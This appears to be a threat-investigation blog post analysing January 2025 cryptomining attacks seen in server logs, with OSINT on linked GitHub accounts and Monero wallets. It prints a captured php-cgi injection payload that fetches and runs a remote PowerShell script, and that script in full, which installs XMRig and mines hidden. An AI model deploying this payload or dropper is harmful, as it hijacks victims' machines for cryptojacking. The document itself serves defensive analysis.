---
title: "The rick and morty XMR and other crytominer. "
date: 2025-01-xx
desciption: "Report: {today} "
tags: [crytominer, investigation]
---


# The rick and morty XMR and other crytominer. 


Around the beginning of January an IP (87.120.125.13) made a request with the following content. 

```sh
 /cgi-bin/php-cgi.exe?arg=
Content-Type: text/plain

<?php system('powershell.exe -Command "& {iwr -Uri http://xxx.xxx.xxx/script.ps1 -OutFile script.ps1; ./script.ps1}"');?> HTTP/1.1" 

```

The content of the scrit that was tempted to download is as follows  

```sh 
# Set Execution Policy
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

# Variables
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$configUrl = "https://evilbit.pro/config.json"
$oastUri = "http://jnkmfjqcorurgzffkisbf61r0lluhxxxz.oast.fun"
$downloadPath = "$env:USERPROFILE\Downloads\xmrig.zip"
$installPath = "C:\xmrig"
$walletAddress = "45Lu4Zzcp64etdoVnc9jSU84WBygC7p5mdrowZic6LVDZERsDszFgcRcF63Gm6kVc7XsvgpvhH36SNfCmUAb1TwbSG7PVTa"
$poolUrl = "pool.supportxmr.com:443"
$workerName = "MyWorker"

# Download XMRig
Write-Host "Downloading XMRig..."
Invoke-WebRequest -Uri $xmrigUrl -OutFile $downloadPath -UseBasicParsing

# Extract XMRig
Write-Host "Extracting XMRig..."
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($downloadPath, $installPath)

# Download config.json
Write-Host "Downloading config.json..."
$configPath = Join-Path $installPath "xmrig-6.22.2\config.json"
Invoke-WebRequest -Uri $configUrl -OutFile $configPath -UseBasicParsing

# Make GET request to the specified URI
Write-Host "Making GET request to the URI..."
Invoke-WebRequest -Uri $oastUri -UseBasicParsing | Out-Null

# Start XMRig in a hidden window
Write-Host "Starting XMRig in a hidden window..."
$xmrigExe = Join-Path $installPath "xmrig-6.22.2\xmrig.exe"
Start-Process -FilePath $xmrigExe -ArgumentList "--config=$configPath" -WindowStyle Hidden

Write-Host "XMRig has started mining in a hidden window! Use Task Manager to stop it if needed."

```

We could observe that one of the elements that doesn't seem standard is the following URL: "https://evilbit.pro/config.json"

An analysis revealed several interesting elements related to the Evilbit cryptocurrency:

- A suspicious website: https://evilbit[.]pro/config.json
- An associated GitHub repository: https://github.com/r1ckpr0/evilbit
- In the repositories of user r1ckpr0 (https://github.com/r1ckpr0?tab=repositories), we find a familiar tool: XMRig (https://github.com/r1ckpr0/xmrig-evilbit)
- The Evilbit repository of r1ckpr0 is actually a fork of another user named evilmortyyy: https://github.com/evilmortyyy/evilbit
- A fork carrying the cryptominer for Windows and Mac: (https://github.com/younicoin/evilbit)

Key points:

- Two users with pseudonyms linked to Rick and Morty
- A website promoting the Evilbit cryptocurrency
- A connection to a cryptominer

It's interesting to note that these elements seem to be linked to a discussion on a Bitcoin forum:
- https://bitcointalk.org/index.php?topic=5351909.0
- https://bitcointalk.org/index.php?topic=5351909.20

evilmortyy and r1ckpr0 are both present in these discussions, which starts to confirm the fact that it's actually only one person behind these two accounts.

We don't have  time for a full investigation, if we find time we'll modify this article to improve it and add elements 

## The other Xmrig sections 

Towards the end of January, we began to see interesting requests with references to a cryto-miner, 

| ip    |   date | request     |
|----:          |----------------------:|   :----------------|
185.213.175.171	|	19/Jan/2025:19:31:12|	{ id :1, jsonrpc : 2.0 , method : login , params :{ login : 49PybvnVss4jhuo7AxfL2TU1CbMXt2qJVhnVPqoys2qxcr2iMwJrCKoSfgAuoxYo6jToQfHpbeREMWKBLApcuCESSDgecfZ , pass : x , agent : XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019 , algo :[ cn/1 , cn/2 , cn/r , cn/fast , cn/half , cn/xao , cn/rto , cn/rwz , cn/zls , cn/double , cn/ccx , cn-lite/1 , cn-heavy/0 , cn-heavy/tube , cn-heavy/xhv , cn-pico , cn-pico/tlo , cn/upx2 , rx/0 , rx/wow , rx/arq , rx/graft , rx/sfx , rx/keva , argon2/chukwa , argon2/chukwav2 , argon2/ninja , astrobwt ]}}
185.213.175.171	|	21/Jan/2025:19:21:17|	{ id :1, jsonrpc : 2.0 , method : login , params :{ login : 45ygML2DygAWWzMCBLEN56DCyrCNH2NbRJPPFkaXWULKS5PvSsVosji9i9QZKwvfSNhFVnc8PrjDRbg948UPW3fzVdoLbzH , pass : x , agent : XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019 , algo :[ cn/1 , cn/2 , cn/r , cn/fast , cn/half , cn/xao , cn/rto , cn/rwz , cn/zls , cn/double , cn/ccx , cn-lite/1 , cn-heavy/0 , cn-heavy/tube , cn-heavy/xhv , cn-pico , cn-pico/tlo , cn/upx2 , rx/0 , rx/wow , rx/arq , rx/graft , rx/sfx , rx/keva , argon2/chukwa , argon2/chukwav2 , argon2/ninja , astrobwt ]}}
185.91.69.110	|	22/Jan/2025:19:48:22|	{ id :1, jsonrpc : 2.0 , method : login , params :{ login : 43TjhWZp2toWPLdTVQn3KJ6fbwjcSpuSZRzezU4Fnbzmdv3NJRKZkMJLt5wJCfNo5D1ne5wFYEPqaThtcthjWH5ZFAzD6y2 , pass : x , agent : XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019 , algo :[ cn/1 , cn/2 , cn/r , cn/fast , cn/half , cn/xao , cn/rto , cn/rwz , cn/zls , cn/double , cn/ccx , cn-lite/1 , cn-heavy/0 , cn-heavy/tube , cn-heavy/xhv , cn-pico , cn-pico/tlo , cn/upx2 , rx/0 , rx/wow , rx/arq , rx/graft , rx/sfx , rx/keva , argon2/chukwa , argon2/chukwav2 , argon2/ninja , astrobwt ]}}
185.91.69.110	|	22/Jan/2025:19:48:22|	{ id :1, jsonrpc : 2.0 , method : login , params :{ login : 43TjhWZp2toWPLdTVQn3KJ6fbwjcSpuSZRzezU4Fnbzmdv3NJRKZkMJLt5wJCfNo5D1ne5wFYEPqaThtcthjWH5ZFAzD6y2 , pass : x , agent : XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019 , algo :[ cn/1 , cn/2 , cn/r , cn/fast , cn/half , cn/xao , cn/rto , cn/rwz , cn/zls , cn/double , cn/ccx , cn-lite/1 , cn-heavy/0 , cn-heavy/tube , cn-heavy/xhv , cn-pico , cn-pico/tlo , cn/upx2 , rx/0 , rx/wow , rx/arq , rx/graft , rx/sfx , rx/keva , argon2/chukwa , argon2/chukwav2 , argon2/ninja , astrobwt ]}}
195.170.172.128	|	26/Jan/2025:09:29:34|	{ id :1, jsonrpc : 2.0 , method : login , params :{ login : 43fRm2LCtZ4ULu4wDTRpawa4wBrvv8EBgNw6zvZ1brKwRxwGSeorgdZjEXeWDhxwavcMYyq8GTpWs4eZ7H9dAVPvFYt3hzD , pass : x , agent : XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019 , algo :[ cn/1 , cn/2 , cn/r , cn/fast , cn/half , cn/xao , cn/rto , cn/rwz , cn/zls , cn/double , cn/ccx , cn-lite/1 , cn-heavy/0 , cn-heavy/tube , cn-heavy/xhv , cn-pico , cn-pico/tlo , cn/upx2 , rx/0 , rx/wow , rx/arq , rx/graft , rx/sfx , rx/keva , argon2/chukwa , argon2/chukwav2 , argon2/ninja , astrobwt ]}}
185.91.69.110	|	26/Jan/2025:09:23:27|	{ id :1, jsonrpc : 2.0 , method : login , params :{ login : 45NUAgtBMGZZAYKEciGqYXYaRGvW8KBJRFveeWNEokSJ9oswC3hQoaJdBF9H87wPePUdBtND1soe3MADtfsMnQ9pEjhCNKZ , pass : x , agent : XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019 , algo :[ cn/1 , cn/2 , cn/r , cn/fast , cn/half , cn/xao , cn/rto , cn/rwz , cn/zls , cn/double , cn/ccx , cn-lite/1 , cn-heavy/0 , cn-heavy/tube , cn-heavy/xhv , cn-pico , cn-pico/tlo , cn/upx2 , rx/0 , rx/wow , rx/arq , rx/graft , rx/sfx , rx/keva , argon2/chukwa , argon2/chukwav2 , argon2/ninja , astrobwt ]}}


## Monero wallet requested

49PybvnVss4jhuo7AxfL2TU1CbMXt2qJVhnVPqoys2qxcr2iMwJrCKoSfgAuoxYo6jToQfHpbeREMWKBLApcuCESSDgecfZ
45ygML2DygAWWzMCBLEN56DCyrCNH2NbRJPPFkaXWULKS5PvSsVosji9i9QZKwvfSNhFVnc8PrjDRbg948UPW3fzVdoLbzH
43TjhWZp2toWPLdTVQn3KJ6fbwjcSpuSZRzezU4Fnbzmdv3NJRKZkMJLt5wJCfNo5D1ne5wFYEPqaThtcthjWH5ZFAzD6y2
43fRm2LCtZ4ULu4wDTRpawa4wBrvv8EBgNw6zvZ1brKwRxwGSeorgdZjEXeWDhxwavcMYyq8GTpWs4eZ7H9dAVPvFYt3hzD
45NUAgtBMGZZAYKEciGqYXYaRGvW8KBJRFveeWNEokSJ9oswC3hQoaJdBF9H87wPePUdBtND1soe3MADtfsMnQ9pEjhCNKZ
